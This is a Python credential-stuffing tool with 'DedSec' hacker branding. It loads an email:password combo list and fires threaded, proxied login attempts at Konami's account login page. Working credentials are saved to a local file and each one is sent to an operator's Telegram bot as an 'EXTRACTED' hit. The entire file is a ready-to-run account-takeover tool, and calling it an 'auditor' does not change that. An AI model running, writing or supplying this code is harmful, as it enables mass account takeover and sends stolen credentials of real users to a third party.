# -*- coding: utf-8 -*-
import requests, time, os, threading, random, sys, telebot

# --- [ DEDSEC VISUAL PROTOCOL ] ---
P = "\033[38;5;93m"  # Deep Purple
C = "\033[38;5;51m"  # Electric Cyan
R = "\033[1;31m"      # Forceful Red
G = "\033[1;32m"      # Safe Green
W = "\033[1;37m"      # High-Contrast White
X = "\033[0m"

# Exact character mapping for the DedSec aesthetic
BANNER = f"""
{P}          ⣴⣾⣿⣿⣷⣦      {P}██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗ 
{P}         ⣾⣿⣿⣿⣿⣿⣿⣷     {P}██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝ 
{P}         ⣿⣿⣿⣿⣿⣿⣿⣿     {P}██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║      
{P}         ⣿⣿{W}⠿⠿{P}⣿⣿{W}⠿⠿{P}⣿⣿     {P}██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║      
{P}         ⢿⣿  {W}⠶{P}  {W}⠶{P}  ⣿⡿     {P}██████╔╝███████╗██████╔╝███████║███████╗╚██████╔╝ 
{P}          ⠙⠻⠾⠯⠽⠟⠋      {P}╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝ 
{P}          ⣠⣴⣶⣶⣶⣄       {C}   [!] J O I N _ T H E _ W A T C H [!]
{P}         ⣾⣿⣿⣿⣿⣿⣿⣷      {W}       [!] V O I D _ S A M P [!]
{P}        ⣸⣿⣿⣿⣿⣿⣿⣿⣿⣇     {R}███████████████████████████████████████
{W} ---------------------------------------------------------------------
 {R}█{W} STATUS: {R}CRITICAL{W} {R}█{W} MODE: {C}FORCE{W} {R}█{W} BOT: {P}ACTIVE{W} {R}█{W} DNS: {G}SAFE{W}
 {R}█████████████████████████████████████████████████████████████████████
"""

def send_to_tg(bot, chat_id, email, password):
    """ Sends individual hits to Telegram immediately in DedSec style """
    msg = (
        f"{P}██ {W}D E D S E C  H I T {P}██\n"
        f"{R}------------------------\n"
        f"{W}ACC: {C}{email}\n"
        f"{W}PSS: {C}{password}\n"
        f"{R}------------------------\n"
        f"{P}[!] STATUS: EXTRACTED"
    )
    try:
        bot.send_message(chat_id, msg)
    except Exception:
        pass

def auditor(email, password, proxy, bot, chat_id):
    """ Core PES authentication engine """
    url = "https://my.konami.net/auth/login.html"
    headers = {'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X)'}
    data = {'konamiId': email, 'password': password, 'login': 'submit'}
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    
    try:
        response = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=10)
        
        # Check for valid login response
        if "errorMessage" not in response.text and response.status_code == 200:
            print(f"{C}[✔] SUCCESS >> {W}{email}")
            send_to_tg(bot, chat_id, email, password)
            with open("DEDSEC_HITS.txt", "a") as f:
                f.write(f"{email}:{password}\n")
        else:
            print(f"{R}[✘] FAILED >> {W}{email}")
    except Exception:
        # Silently handle timeouts or proxy deaths
        pass

def main():
    os.system('clear')
    print(BANNER)
    
    # --- INTERACTIVE CONFIGURATION ---
    print(f"{C}[*] INITIALIZING DEDSEC_GHOST_NET...{X}")
    tk = input(f"{P}┌──({C}DedSec{P})─[{W}Bot_Token{P}]\n└─{W}➤ ")
    id = input(f"{P}┌──({C}DedSec{P})─[{W}Chat_ID{P}]\n└─{W}➤ ")
    
    try:
        bot = telebot.TeleBot(tk)
    except Exception as e:
        print(f"{R}[!] FATAL ERROR: INVALID BOT TOKEN")
        return
    
    print(f"\n{C}[*] SELECTING DATA SOURCE...{X}")
    path = input(f"{P}┌──({C}DedSec{P})─[{W}Combo_Path{P}]\n└─{W}➤ ")
    proxy = input(f"{P}┌──({C}DedSec{P})─[{W}Proxy_Addr{P}]\n└─{W}➤ ")

    if not os.path.exists(path):
        print(f"{R}[!] ERROR: COMBO FILE NOT FOUND{X}")
        return

    # Load combos with UTF-8 support to prevent crash
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = f.readlines()

    print(f"\n{C}[*] GHOST_ENGINE IGNITED. BREACHING TARGETS...{X}\n")

    for line in combos:
        if ":" in line:
            # Split email and password
            parts = line.strip().split(":")
            if len(parts) >= 2:
                u, p = parts[0], parts[1]
                # Threaded execution for real-time hits
                t = threading.Thread(target=auditor, args=(u, p, proxy, bot, id))
                t.start()
                # Delay to prevent iSH/iPadOS memory overflow
                time.sleep(0.2)

if __name__ == "__main__":
    main()
